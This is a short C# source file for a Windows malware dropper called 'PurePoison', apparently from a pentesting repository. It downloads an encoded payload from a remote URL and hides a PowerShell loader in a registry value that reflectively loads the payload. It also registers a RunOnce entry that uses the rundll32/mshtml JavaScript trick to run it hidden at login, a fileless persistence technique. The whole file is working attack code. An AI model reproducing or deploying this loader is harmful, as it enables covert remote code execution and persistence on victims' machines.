/*
 * Created by Voraka.
 * Date: 9/7/2017
 * Time: 1:24 PM
 */
using System;
using System.Diagnostics;
using System.Reflection;
using Microsoft.Win32;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;


namespace PurePoison
{
	class Program
	{
		static string url = "https://raw.githubusercontent.com/voraka/Pentest/master/Hello/Hello.exe_enc.txt";
		static string REG_RUNNER = "rundll32.exe javascript:\"\\..\\mshtml, RunHTMLApplication \";(eval(\"new ActiveXObject('WScript.Shell').Run('powershell.exe -Command iex((Get-ItemProperty -Path hkcu:LANMedia).MPEG4Base64)',0)\"))(window.close())";
		static string REG_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
		static string payload ="";
		
		
		public static void Install(string payload)
		{
		    Registry.CurrentUser.CreateSubKey("LANMedia").SetValue("MPEG4Base64", string.Format("([System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{0}\"))).EntryPoint.Invoke($null,$null)", payload));
		}
		
		public static void StartUP()
		{
		    try
		    {
			Registry.CurrentUser.CreateSubKey(REG_PATH).SetValue("PurePoison", REG_RUNNER);
		    }
		    catch
		    {
		    }
		}
		
		
		public static string Download()
		{
			string content = "";
			WebClient webClient = new WebClient();
			content = webClient.DownloadString(url);
			//Console.WriteLine(text);
			return content;
		}
		
		public static void Main()
		{
			payload = Download();
			StartUP();
			Install(payload);
		}
	}
}
